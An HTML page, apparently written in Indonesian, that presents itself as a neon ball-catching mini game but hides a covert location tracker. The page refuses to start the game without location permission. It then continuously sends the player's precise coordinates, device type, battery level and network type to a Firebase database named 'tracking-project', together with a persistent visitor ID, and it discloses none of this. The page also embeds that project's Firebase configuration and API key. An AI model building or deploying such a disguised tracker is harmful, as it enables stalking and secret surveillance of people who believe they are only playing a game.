<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Neon Mini Game</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      background: radial-gradient(circle at center, #0f0f0f, #000);
      font-family: 'Orbitron', sans-serif;
      color: #0ff;
      overflow: hidden;
    }

    /* ===== Loading Screen ===== */
    #loadingScreen {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      height: 100%;
      width: 100%;
      position: absolute;
      top: 0; left: 0;
      background: radial-gradient(circle at center, #0f0f0f, #000);
    }
    #loadingScreen h2 {
      font-size: 28px;
      margin-bottom: 20px;
      text-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.6; }
      100% { opacity: 1; }
    }
    .loader {
      width: 120px;
      height: 120px;
      border: 5px solid rgba(0, 255, 255, 0.2);
      border-top: 5px solid #0ff;
      border-radius: 50%;
      animation: spin 2s linear infinite;
      box-shadow: 0 0 20px #0ff;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* ===== Start Screen ===== */
    #startScreen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      width: 100%;
      position: absolute;
      top: 0; left: 0;
      background: radial-gradient(circle at center, #0f0f0f, #000);
    }
    #startScreen h2 {
      font-size: 26px;
      margin-bottom: 20px;
      text-shadow: 0 0 15px #0ff;
    }
    #startBtn {
      padding: 12px 25px;
      font-size: 18px;
      font-family: 'Orbitron', sans-serif;
      background: #0ff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
      box-shadow: 0 0 15px #0ff, 0 0 30px #0ff;
      transition: transform 0.2s;
    }
    #startBtn:hover {
      transform: scale(1.1);
    }

    /* ===== Game Area ===== */
    #gameWrapper {
      display: none;
      flex-direction: column;
      align-items: center;
      width: 100%;
    }
    #gameArea {
      position: relative;
      width: 100vw;
      height: 80vh;
      border: 2px solid #0ff;
      margin: auto;
      overflow: hidden;
      background: rgba(255,255,255,0.05);
    }
    .ball {
      position: absolute;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #ff0;
      box-shadow: 0 0 10px #ff0;
    }
    #basket {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 20px;
      background: #0ff;
      border-radius: 5px;
      box-shadow: 0 0 10px #0ff;
    }
    #score {
      font-size: 18px;
      margin-top: 10px;
      text-shadow: 0 0 10px #0ff;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
  <!-- Loading Screen -->
  <div id="loadingScreen">
    <h2>âš¡ Loading Game Assets...</h2>
    <div class="loader"></div>
  </div>

  <!-- Start Screen -->
  <div id="startScreen">
    <h2>ðŸŽ® Neon Mini Game ðŸŽ®</h2>
    <button id="startBtn">Mulai Game</button>
  </div>

  <!-- Game Wrapper -->
  <div id="gameWrapper">
    <h2>ðŸŽ® Tangkap Bola Neon ðŸŽ®</h2>
    <div id="score">Score: 0</div>
    <div id="gameArea">
      <div id="basket"></div>
    </div>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

  <script>
    // ===== Loading Effect =====
    window.addEventListener("load", () => {
      setTimeout(() => {
        document.getElementById("loadingScreen").style.display = "none";
        document.getElementById("startScreen").style.display = "flex";
      }, 3000); // 3 detik loading
    });

    // ===== Firebase Config =====
    const firebaseConfig = {
      apiKey: "AIzaSyAeG3eB_zyWapubCKyIFaaF50aXF8GhipE",
      authDomain: "tracking-project-d4fa6.firebaseapp.com",
      databaseURL: "https://tracking-project-d4fa6-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "tracking-project-d4fa6",
      storageBucket: "tracking-project-d4fa6.firebasestorage.app",
      messagingSenderId: "953812351968",
      appId: "1:953812351968:web:17ae63a8d1ece032e68985",
      measurementId: "G-0HWLTMWJ4T"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // ===== Tracking User =====
    function getUserId() {
      let uid = localStorage.getItem("trackingUserId");
      if (!uid) {
        uid = "user_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
        localStorage.setItem("trackingUserId", uid);
      }
      return uid;
    }
    const userId = getUserId();

    function getDeviceName() {
      const ua = navigator.userAgent.toLowerCase();
      if (ua.includes("android")) return "Android Phone";
      if (ua.includes("iphone")) return "iPhone";
      if (ua.includes("ipad")) return "iPad";
      if (ua.includes("windows")) return "Windows PC";
      if (ua.includes("mac")) return "MacOS";
      return ua;
    }

    async function getBatteryLevel() {
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          return Math.round(battery.level * 100);
        } catch {
          return null;
        }
      }
      return null;
    }

    function getNetworkType() {
      if (navigator.connection && navigator.connection.effectiveType) {
        return navigator.connection.effectiveType.toUpperCase();
      }
      return "Unknown";
    }

    function startTracking() {
      if (!navigator.geolocation) return;

      navigator.geolocation.watchPosition(async pos => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        const accuracy = pos.coords.accuracy;

        const deviceName = getDeviceName();
        const battery = await getBatteryLevel();
        const network = getNetworkType();

        database.ref("users/" + userId).set({
          lat, lng, accuracy,
          deviceName,
          battery: battery !== null ? battery + "%" : "Unknown",
          network,
          time: Date.now()
        });
      }, err => {
        console.error("Error ambil lokasi:", err);
      }, { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 });
    }

    // ===== Mulai Game setelah klik =====
    document.getElementById("startBtn").addEventListener("click", () => {
      // Minta izin lokasi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(() => {
          startTracking();
          document.getElementById("startScreen").style.display = "none";
          document.getElementById("gameWrapper").style.display = "flex";
        }, () => {
          alert("Game membutuhkan izin lokasi untuk dimulai!");
        });
      } else {
        alert("Browser tidak mendukung lokasi.");
      }
    });

    // ===== Mini Game Script =====
    const gameArea = document.getElementById("gameArea");
    const basket = document.getElementById("basket");
    const scoreDisplay = document.getElementById("score");
    let score = 0;

    document.addEventListener("mousemove", e => {
      let x = e.clientX - basket.offsetWidth / 2;
      basket.style.left = x + "px";
    });
    document.addEventListener("touchmove", e => {
      let x = e.touches[0].clientX - basket.offsetWidth / 2;
      basket.style.left = x + "px";
    });

    function spawnBall() {
      const ball = document.createElement("div");
      ball.className = "ball";
      ball.style.left = Math.random() * (gameArea.offsetWidth - 30) + "px";
      ball.style.top = "0px";
      gameArea.appendChild(ball);

      let fallInterval = setInterval(() => {
        let top = parseInt(ball.style.top);
        ball.style.top = top + 5 + "px";

        let ballRect = ball.getBoundingClientRect();
        let basketRect = basket.getBoundingClientRect();

        if (
          ballRect.bottom >= basketRect.top &&
          ballRect.left >= basketRect.left &&
          ballRect.right <= basketRect.right
        ) {
          score++;
          scoreDisplay.innerText = "Score: " + score;
          ball.remove();
          clearInterval(fallInterval);
        }

        if (top > gameArea.offsetHeight) {
          ball.remove();
          clearInterval(fallInterval);
        }
      }, 30);
    }

    setInterval(spawnBall, 1500);
  </script>
</body>
</html>
